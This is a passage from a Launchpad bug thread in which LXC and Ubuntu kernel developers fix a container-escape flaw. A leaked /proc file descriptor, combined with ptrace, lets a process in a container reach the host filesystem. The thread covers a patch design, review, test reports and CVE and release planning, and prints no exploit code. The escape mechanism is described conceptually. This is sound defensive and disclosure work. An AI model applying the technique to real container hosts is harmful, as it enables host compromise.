&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*        X           &lt;---  send pid of<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*                          attached proc,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*                          then exit<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*    send 0 -------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-&gt;    X<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*                                              [do initialization]<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*        X  &lt;------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />--  send 1<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*   [add to cgroup, ...]<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*    send 2 -------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-&gt;    X<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*                                              [set LXC_ATTACH_<wbr />NO_NEW_<wbr />PRIVS]<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*        X  &lt;------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />--  send 3<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*   [open LSM label fd]<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*    send 4 -------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-&gt;    X<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*                                              [set LSM label]<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*   close socket                                 close socket<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*                                            ...</p></div>
    
    <p>
      <a href="/ubuntu/+source/lxc/+bug/1639345/comments/23">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I was to optimistic about the userspace fix. The fix alone might minimize the attack surface but unfortunately we seem to need the kernel fix. The child we attach in lxc-attach wants to change its LSM label appropriately right before exec() and for that it needs an fd to /proc/self/attr/current. So we seem to always have such an fd around. But what we can do is instead of passing an fd to /proc itself around, is to open up an fd to /proc/self/attr/current in the parent and send it to the child. This might minimize the attack surface but we still need the kernel fix. I post an updated version of the patch I sent before here and I'll keep thinking a little more on how we can avoid having to pass any procfd around. But I doubt it. The more complex solution I outlined above, involving a second lxc_clone() which serves as a simple chrooting process to place is into a isolated set of namespaces is an additional attack surface minimizer. @Stéphane, do you think it be worth adding another process that chroots/minimally namspaces us before attaching to the childs namespaces?


Here's the outline of the current patch:
    So far, we opened a file descriptor refering to proc on the host inside the
    host namespace and handed that fd to the attached process in
    attach_child_main(). This was done to ensure that LSM labels were correctly
    setup. However, by exploiting a potential kernel bug, ptrace could be used to
    prevent the file descriptor from being closed which in turn could be used by an
    unprivileged container to gain access to the host namespace. Aside from this
    needing an upstream kernel fix, we should make sure that we don't pass the fd
    for proc itself to the attached process. However, we cannot completely prevent
    this, as the attached process needs to be able to change its apparmor profile
    by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the
    attack surface, we only send the fd for /proc/self/attr/exec or
    /proc/self/attr/current to the attached process. To do this we introduce a
    little more IPC between the child and parent:

             * IPC mechanism: (X is receiver)
             *   initial process        intermediate          attached
             *        X           &lt;---  send pid of
             *                          attached proc,
             *                          then exit
             *    send 0 ------------------------------------&gt;    X
             *                                              [do initialization]
             *        X  &lt;------------------------------------  send 1
             *   [add to cgroup, ...]
             *    send 2 ------------------------------------&gt;    X
             *                                              [set LXC_ATTACH_NO_NEW_PRIVS]
             *        X  &lt;------------------------------------  send 3
             *   [open LSM label fd]
             *    send 4 ------------------------------------&gt;    X
             *                                              [set LSM label]
             *   close socket                                 close socket
             *                                                run program

    The attached child tells the parent when it is ready to have its LSM labels set
    up. The parent then opens an approriate fd for the child PID to
    /proc/&lt;pid&gt;/attr/exec or /proc/&lt;pid&gt;/attr/current and sends it via SCM_RIGHTS
    to the child. The child can then set its LSM laben. Both sides then close the
    socket fds and the child execs the requested process.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~henrix" class="sprite person">Luis Henriques (henrix)</a>
    
    <time title="2016-11-09 19:49:28 UTC" datetime="2016-11-09T19:49:28.856374+00:00">on 2016-11-09</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Trusty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Committed
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Vivid): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Committed
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Xenial): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Committed
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Yakkety): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Committed
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~jjohansen" class="sprite person">John Johansen (jjohansen)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-09T20:19:06.013479+00:00" title="2016-11-09 20:19:06 UTC">on 2016-11-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The kernel patch looks good to me, and I have done a first pass through the patch from comment 23 and didn&#x27;t see anything of note there.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The kernel patch looks good to me, and I have done a first pass through the patch from comment 23 and didn't see anything of note there.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~henrix" class="sprite person">Luis Henriques (henrix)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-14T15:51:38.038242+00:00" title="2016-11-14 15:51:38 UTC">on 2016-11-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag &#x27;verification-<wbr />needed-<wbr />trusty&#x27; to &#x27;verification-<wbr />done-trusty&#x27;<wbr />.</p>
<p>If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.</p>
<p>See <a rel="nofollow" href="https://wiki.ubuntu.com/Testing/EnableProposed">https:/<wbr />/wiki.ubuntu.<wbr />com/Testing/<wbr />EnableProposed</a> for documentation how to enable and use -proposed. Thank you!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-trusty' to 'verification-done-trusty'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: verification-needed-trusty
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-14T16:00:43.684975+00:00" title="2016-11-14 16:00:43 UTC">on 2016-11-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@brauner: Can you attach patches for stable-1.0, stable-2.0 and current master?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@brauner: Can you attach patches for stable-1.0, stable-2.0 and current master?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-14T16:02:07.434995+00:00" title="2016-11-14 16:02:07 UTC">on 2016-11-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@brauner: Can you also let Eric know that his patch does in fact seem to fix this security issue? That should motivate him in getting it pushed to stable sooner.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@brauner: Can you also let Eric know that his patch does in fact seem to fix this security issue? That should motivate him in getting it pushed to stable sooner.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-14T16:44:13.340715+00:00" title="2016-11-14 16:44:13 UTC">on 2016-11-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Tested with Trusty kernel</p>
<p>pool/main/<wbr />l/linux/<wbr />linux-image-<wbr />3.13.0-<wbr />102-generic_<wbr />3.13.0-<wbr />102.149_<wbr />amd64.deb</p>
<p>from proposed but on Xenial test machine. Tool now aborts with</p>
<p>&quot;Attach failed&quot;</p>
<p>no matter what is set in /proc/sys/<wbr />kernel/<wbr />yama/ptrace_<wbr />scope on host.</p>
<p>Not sure if that Trusty/Xenial cross-release check is sufficient for verification.</p>
<p>The Xenial kernel from proposed does not fix the issues yet (wasn&#x27;t claimed in the discussion anyway)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Tested with Trusty kernel

pool/main/l/linux/linux-image-3.13.0-102-generic_3.13.0-102.149_amd64.deb

from proposed but on Xenial test machine. Tool now aborts with

"Attach failed"

no matter what is set in /proc/sys/kernel/yama/ptrace_scope on host.

Not sure if that Trusty/Xenial cross-release check is sufficient for verification.

The Xenial kernel from proposed does not fix the issues yet (wasn't claimed in the discussion anyway)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sforshee" class="sprite person">Seth Forshee (sforshee)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-14T17:56:13.588417+00:00" title="2016-11-14 17:56:13 UTC">on 2016-11-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Roman: The other kernels (vivid, xenial, and yakkety) have builds with the fix in the canonical-<wbr />kernel-<wbr />team PPA but those builds haven&#x27;t yet been copied to -proposed yet. You will see similar &quot;This bug is awaiting verification ...&quot; for each kernel as it reaches -proposed.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Roman: The other kernels (vivid, xenial, and yakkety) have builds with the fix in the canonical-kernel-team PPA but those builds haven't yet been copied to -proposed yet. You will see similar "This bug is awaiting verification ..." for each kernel as it reaches -proposed.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~jsalisbury" class="sprite person">Joseph Salisbury (jsalisbury)</a>
    
    <time title="2016-11-14 19:21:59 UTC" datetime="2016-11-14T19:21:59.827151+00:00">on 2016-11-14</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: kernel-da-key
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-14T23:38:04+00:00" title="2016-11-14 23:38:04 UTC">on 2016-11-14</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On 11/09/2016 01:36 AM, Stéphane Graber wrote:<br />
<span class="foldable-quoted">
&gt; Security team: Please assign a CVE for LXC. And please review suggested fix.
</span></p>
<p>I think I&#x27;ve spotted one minor problem with the suggested fix. In<br />
attach_<wbr />child_main(<wbr />), shutdown(<wbr />ipc_socket, SHUT_RDWR) is not called when<br />
lxc_seccomp_load() fails.</p>
<p>As for the CVE assignment for LXC, the Ubuntu Security Team is not<br />
assigning CVEs at this time. Once we settle on a preferred CRD, I can<br />
notify the linux-distros list about this issue and request a CVE at that<br />
time.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On 11/09/2016 01:36 AM, Stéphane Graber wrote:
&gt; Security team: Please assign a CVE for LXC. And please review suggested fix.

I think I've spotted one minor problem with the suggested fix. In
attach_child_main(), shutdown(ipc_socket, SHUT_RDWR) is not called when
lxc_seccomp_load() fails.

As for the CVE assignment for LXC, the Ubuntu Security Team is not
assigning CVEs at this time. Once we settle on a preferred CRD, I can
notify the linux-distros list about this issue and request a CVE at that
time.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-15T21:12:45.184171+00:00" title="2016-11-15 21:12:45 UTC">on 2016-11-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4777815/+files/0001-attach-do-not-send-procfd-to-attached-process.patch">0001-attach-do-not-send-procfd-to-attached-process.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4777815">Edit</a>
        (14.8 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Attached is a new version of the patch that adds the missing shutdown(<wbr />ipc_socket, SHUT_RDWR) call that Tyler was pointing out.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Attached is a new version of the patch that adds the missing shutdown(ipc_socket, SHUT_RDWR) call that Tyler was pointing out.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-15T21:33:47.849903+00:00" title="2016-11-15 21:33:47 UTC">on 2016-11-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ok, so on the topic of CVE assignation, I&#x27;ve been going back and forth on this throughout the day.</p>
<p>Ultimately the security issue is with the kernel and Eric&#x27;s patch fixes that, that in my mind is the real CVE worthy issue here.</p>
<p>On the LXC side of things, the current implementation of procfd allows an attacker to get a dirfd to the host&#x27;s /proc which then allows escaping to the host&#x27;s filesystem and ultimately completely escaping from the container.</p>
<p>Christian&#x27;s fix restricts that exposure to just the apparmor label switching interface, making it still possible for an attacker in the container to alter the apparmor profile of the joining task.<br />
That&#x27;s still a security problem, but much less worse than a privileged escalation (in the case of a privileged attach process) and full container escape.</p>
<p>So as it stands, I think we&#x27;ll want a CVE for the LXC side of this as even without the related kernel fix, the proposed fix does make things massively better by turning a privilege escalation + container escape issue into &quot;just&quot; an apparmor bypass issue.</p>
<p>As far as CRD, assuming we&#x27;re all happy with the proposed fix. Anytime next week would be fine with me. If that&#x27;s not an option, then the 1st or 2nd of December would work too.</p>
<p>I&#x27;m going to be mostly unavailable between the 28th and 30th and then again between the 5th and 9th so would rather avoid those days.</p>
<p>As usual, the plan will be for upstream LXC to push out security releases for the two supported branches as well as handle the announcement. So I&#x27;ll be tagging LXC 1.0.9 and LXC 2.0.6 containing only this one fix on top of the latest stable release (1.0.8 and 2.0.5 respectively).</p>
<p>For Ubuntu, that means:<br />
&nbsp;- precise-backports: update to 1.0.9<br />
&nbsp;- trusty: update to 1.0.9<br />
&nbsp;- xenial: update to 2.0.6<br />
&nbsp;- yakkety: update to 2.0.6<br />
&nbsp;- zesty: update to 2.0.6</p>
<p>Once we&#x27;ve had a few more eyes on the proposed patch and have a CRD set in stone, I&#x27;ll push all of the above in the private LXC security PPA, then on the CRD, the security team (or I) can just copy all of that stuff in the archive.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ok, so on the topic of CVE assignation, I've been going back and forth on this throughout the day.

Ultimately the security issue is with the kernel and Eric's patch fixes that, that in my mind is the real CVE worthy issue here.

On the LXC side of things, the current implementation of procfd allows an attacker to get a dirfd to the host's /proc which then allows escaping to the host's filesystem and ultimately completely escaping from the container.

Christian's fix restricts that exposure to just the apparmor label switching interface, making it still possible for an attacker in the container to alter the apparmor profile of the joining task.
